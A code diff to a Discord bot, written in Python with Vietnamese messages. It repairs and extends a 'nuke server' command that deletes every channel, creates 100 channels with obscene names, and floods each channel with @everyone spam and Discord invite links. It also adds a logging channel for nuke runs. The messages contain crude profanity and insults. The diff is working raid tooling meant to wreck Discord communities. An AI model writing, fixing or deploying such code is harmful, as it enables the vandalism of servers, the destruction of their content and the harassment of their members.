@@ -38,6 +38,9 @@ spam_task_running = None
 # Lưu trữ số dư coin của member: {user_id: coin_balance}
 USER_COINS = {}
 
+
+NUKE_LOG_CHANNELS = {}  # {guild_id: channel_id}
+
 # Lưu trữ yêu cầu nhân cách tùy chỉnh của member từ lệnh l!setpersona
 CUSTOM_USER_PERSONAS = {}
 
@@ -340,16 +343,17 @@ async def nuke_server(ctx):
         confirm_embed = discord.Embed(
             title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
             description=(
-                f"🔥 **Boss Tuyền kính yêu, yêu con cặc chó bảo ngu!**\n\n"
+                f"🔥 **Boss Tuyền kính yêu!**\n\n"
                 f"Lệnh này sẽ:\n"
-                f"• Xóa **TOÀN BỘ** kênh trong server nuke thì trả xoá ngu vậy thg em, botngaso (text/voice/categories)\n"
-                f"• Tạo **100 , 36 kênh mới** với tên tục tĩu\n"
+                f"• Xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n"
+                f"• Tạo **100 kênh mới** với tên tục tĩu\n"
                 f"• Spam thông điệp nuke trong mỗi kênh\n\n"
-                f"🔹 **Gõ l!confirmnuke để xác nhận mày bị gay**\n"
+                f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
                 f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
             ),
             color=0xFF0000
         )
+        await ctx.send(embed=confirm_embed)
 
         def check(m):
             return m.author == ctx.author and m.channel == ctx.channel
@@ -363,6 +367,18 @@ async def nuke_server(ctx):
             await ctx.send("⏳ Hết thời gian chờ. Lệnh nuke đã bị hủy bỏ.")
             return
 
+        # 🔥 GỬI LOG BẮT ĐẦU (nếu có kênh log)
+        if ctx.guild.id in NUKE_LOG_CHANNELS:
+            log_channel = bot.get_channel(NUKE_LOG_CHANNELS[ctx.guild.id])
+            if log_channel:
+                start_embed = discord.Embed(
+                    title="🔥 NUKE BẮT ĐẦU",
+                    description=f"**Server:** {ctx.guild.name}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
+                    color=0xFF0000,
+                    timestamp=discord.utils.utcnow()
+                )
+                await log_channel.send(embed=start_embed)
+
         nuke_embed = discord.Embed(
             title="🚀 KÍCH HOẠT GIAI ĐOẠN NUKE SERVER 🚀",
             description="🔥 **Đang thực hiện phá hủy toàn bộ server...** 🔥",
@@ -370,28 +386,31 @@ async def nuke_server(ctx):
         )
         await ctx.send(embed=nuke_embed)
 
+        # Xóa kênh
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
+                await asyncio.sleep(0.3)
             except:
                 continue
 
+        # Tạo 100 kênh mới
         for i in range(100):
             try:
                 channel_name = random.choice(NUKE_CHANNEL_NAMES)
                 await ctx.guild.create_text_channel(name=channel_name)
+                await asyncio.sleep(0.5)
             except:
                 continue
 
-        # Nội dung spam theo đúng yêu cầu mới
+        # Spam nội dung
         spam_content = (
-            "# sv ngu bị thg <@1537442886323404860> nuke r hahaha ngu vl đúng súc vật\n"
+            "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
             "@everyone\n"
             "@here\n"
             "link support 1: https://discord.gg/hqa3xAzsbk\n"
             "link support 2: https://discord.gg/j9KeGaPXh"
         )
-
         for channel in ctx.guild.text_channels:
             try:
                 for _ in range(10):
@@ -400,20 +419,32 @@ async def nuke_server(ctx):
             except:
                 continue
 
-         log_channel_id = data_manager.get(f"nuke_log_{ctx.guild.id}")
-        if log_channel_id:
-            log_channel = ctx.guild.get_channel(log_channel_id)
+        # Hoàn thành
+        complete_embed = discord.Embed(
+            title="💀 NUKE SERVER HOÀN TẤT 💀",
+            description=(
+                f"🔥 **Server đã bị phá hủy hoàn toàn theo lệnh của Boss Tuyền!** 🔥\n\n"
+                f"• **Đã xóa:** Tất cả kênh gốc\n"
+                f"• **Đã tạo:** 100 kênh mới\n"
+                f"• **Đã spam:** Thông điệp nuke trong mỗi kênh\n\n"
+                f"💀 **Server này đã trở thành địa ngục sắc hồng!** 💀"
+            ),
+            color=0xFF0000
+        )
+        await ctx.send(embed=complete_embed)
+
+        # ✅ GỬI LOG HOÀN THÀNH (nếu có kênh log)
+        if ctx.guild.id in NUKE_LOG_CHANNELS:
+            log_channel = bot.get_channel(NUKE_LOG_CHANNELS[ctx.guild.id])
             if log_channel:
-                embed = discord.Embed(
-                    title="🔥 NUKE BẮT ĐẦU",
-                    description=f"**Server:** {ctx.guild.name}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
-                    color=0xFF0000,
-                    timestamp=utcnow()
+                end_embed = discord.Embed(
+                    title="✅ NUKE HOÀN TẤT",
+                    description=f"**Server:** {ctx.guild.name}\n**Thời gian hoàn thành:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
+                    color=0x00FF00,
+                    timestamp=discord.utils.utcnow()
                 )
-                await log_channel.send(embed=embed)
-        
-        await ctx.send(embed=confirm_embed)
-        
+                await log_channel.send(embed=end_embed)
+
     except Exception as e:
         error_embed = discord.Embed(
             title="❌ LỖI KHI THỰC HIỆN NUKE",
@@ -639,21 +670,7 @@ async def spam_roles_error(ctx, error):
     else:
         await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
 
-    @commands.command(name="setlognuke")
-    @commands.has_permissions(administrator=True)
-    async def setlognuke_cmd(self, ctx, channel: discord.TextChannel = None):
-        """Thiết lập kênh log cho lệnh nuke: l!setlognuke #channel"""
-        if channel is None:
-            channel = ctx.channel
-        data_manager.set(f"nuke_log_{ctx.guild.id}", channel.id)
-        embed = discord.Embed(
-            title="📋 Đã thiết lập kênh log nuke",
-            description=f"Kênh log nuke sẽ là {channel.mention}",
-            color=0x00CCFF,
-            timestamp=utcnow()
-        )
-        embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
-        await ctx.send(embed=embed)
+    
 
 # ==================== LỆNH XÓA TẤT CẢ ROLE ====================
 @bot.command(name="deleteallroles")
@@ -1420,6 +1437,23 @@ async def stats(ctx):
         
     embed.set_footer(text=f"Truy vấn bởi {ctx.author.name} • Cung kính phục vụ Boss Tuyền & Cộng đồng trong sắc hồng ⚡", icon_url=ctx.author.display_avatar.url)
     
+    await ctx.send(embed=embed)
+
+@bot.command(name="setlognuke")
+@is_bot_owner()
+async def setlognuke(ctx, channel: discord.TextChannel = None):
+    """Thiết lập kênh log cho lệnh nuke: l!setlognuke #channel"""
+    global NUKE_LOG_CHANNELS
+    if channel is None:
+        channel = ctx.channel
+    NUKE_LOG_CHANNELS[ctx.guild.id] = channel.id
+    embed = discord.Embed(
+        title="📋 Đã thiết lập kênh log nuke",
+        description=f"Kênh log nuke sẽ là {channel.mention}",
+        color=0x00CCFF,
+        timestamp=discord.utils.utcnow()
+    )
+    embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
     await ctx.send(embed=embed)
 
 @bot.command(name="help")
